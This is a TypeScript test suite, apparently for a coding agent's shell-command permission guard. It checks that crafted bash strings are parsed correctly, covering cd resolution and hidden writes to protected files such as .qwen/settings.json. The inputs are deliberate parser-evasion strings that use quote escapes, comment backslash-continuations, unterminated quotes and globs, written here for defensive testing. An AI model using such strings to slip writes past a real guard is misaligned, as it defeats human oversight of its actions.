  // The bash walk finds no operation here (its last segment is one quoted
  // blob), so the union-split fallback runs. Its `cd 'x\'';echo '` target is
  // a quoting artifact only the union split produces, and marking it used to
  // require a metacharacter in the word; without one it became a trusted
  // static cwd and the write was published under a phantom /repo/x path with
  // no cwd-unknown flags (#12280 R1-3).
  it('escalates a cd target only the union split produces (#12280-R1-3)', () => {
    expect(
      across(
        `cd 'x\\'';echo ' & cd sub ; echo # note '\necho {} > docs/plan.md`,
      ),
    ).toEqual([uncertainWrite('/repo/sub/docs/plan.md')]);
  });

  // An inert sibling segment whose text happens to occur inside the `cd`
  // target (`ls` inside `tools`, `build` inside `C:\build`) is not a split
  // artifact; only a finer cut strictly inside the segment's span marks one.
  // Substring containment escalated these genuine directories and lost the
  // concrete paths a deny rule cites (#12280 R1-2).
  it('resolves a genuine directory whose text contains a sibling segment (#12280-R1-2)', () => {
    expect(
      across(`cd '/opt/R&D\\tools' ; ls ; echo {} > settings.json`),
    ).toEqual([dir('/opt/R&D/tools'), write('/opt/R&D/tools/settings.json')]);
    expect(
      across(`cd 'C:\\build\\R&D' && build && echo {} > settings.json`),
    ).toEqual([write('C:/build/R&D/settings.json')]);
  });
});

describe('R2 review round: comment-continuation desync, merge flag union', () => {
  // The segment splitter suppresses `\<newline>` as a continuation even
  // where the backslash sits inside a `#` comment, but bash ends the comment
  // at the newline regardless. Emitting that newline from the comment cut
  // glued the next line's first word onto the `cd` operand list (tokenize
  // splits on space/tab only), so a `cd` bash really performs de-resolved
  // to cwdUnknown and a hard deny dropped to an ask. The cut now stops at
  // such a comment, leaving the remainder as the separate command bash
  // sees (#12280 R2-2).
  it.each([
    'cd .qwen # note \\\necho x ; echo {} > settings.json',
    'cd .qwen # note \\\\\\\necho x ; echo {} > settings.json',
    'cd .qwen # note \\\n\techo x ; echo {} > settings.json',
    'cd .qwen # note \\\n  && echo {} > settings.json',
    'pushd .qwen # note \\\necho x ; echo {} > settings.json',
  ])(
    'keeps the cd resolution when a comment ends in backslashes: `%s` (#12280-R2-2)',
    (command) => {
      expect(across(command)).toEqual([write(REPO_SETTINGS)]);
    },
  );

  // The merge branch runs only where the bash scan cannot be trusted to
  // have seen the whole command, so a key collision there must not drop the
  // losing copy's escalation flags; the bash copy still wins attribution
  // (#12280 R2-3).
  it('keeps the escalation flags when a merge collision drops the extra copy (#12280-R2-3)', () => {
    expect(across(`echo done # note 'a\\''\ncd 'x\\' ; touch f`)).toEqual([
      uncertainWrite('/repo/f'),
    ]);
  });

  // bash reads the `\'` inside `'a\'` as literal, so its scan closes the
  // single quote early and the later `"` opens a double quote that never
  // closes: the `; echo x > f` tail sits inside what bash treats as a quoted
  // blob (bash itself refuses the whole line, verified against /bin/bash).
  // The other reading closes the single quote at `b'` and still sees the
  // write, and the merge must keep it (#12280 R2-7).
  it('merges the write hidden behind an unterminated double quote (#12280-R2-7)', () => {
    expect(across(`echo y > g ; echo 'a\\' ; echo "b' ; echo x > f`)).toEqual([
      write('/repo/g'),
      write('/repo/f'),
    ]);
  });

  // A `cd` target is only trusted when the analysis can show bash enters
  // exactly that directory. Glob and tilde spellings expand at runtime, an
  // erased process substitution under-counts the operands (bash fails the
  // cd with too many arguments), and an option word bash rejects leaves the
  // shell where it started (#12280 R2-1).
  it.each([
    ['cd * ; echo {} > .qwen/settings.json', REPO_SETTINGS],
    ['cd su* ; echo {} > settings.json', '/repo/settings.json'],
    ['cd {a,b} ; echo {} > settings.json', '/repo/settings.json'],
    ['cd ~- ; echo {} > settings.json', '/repo/settings.json'],
    ['cd -x ; echo {} > .qwen/settings.json', REPO_SETTINGS],
    ['cd backup >(tee log) ; cd sub ; echo {} > f', '/repo/sub/f'],
  ])(
    'escalates a cd bash does not provably perform: `%s` (#12280-R2-1)',
    (command, expectedPath) => {
      expect(across(command)).toEqual([uncertainWrite(expectedPath)]);
    },
  );

  // bash really does swallow the operand into the comment and perform a bare
  // `cd` (to $HOME) here; what the guard must never publish is the raw
  // newline inside a path (#12280 R2-2).
  it('publishes no raw-newline path for the operand-swallowing comment (#12280-R2-2)', () => {
    const result = across('cd # note \\\nsub ; echo {} > settings.json');
    expect(result).toHaveLength(1);
    expect(result[0]).toMatchObject({ virtualTool: 'write_file' });
    expect(result[0]!.filePath).not.toContain('\n');
    expect(result[0]!.cwdUnknown).toBeUndefined();
  });
});
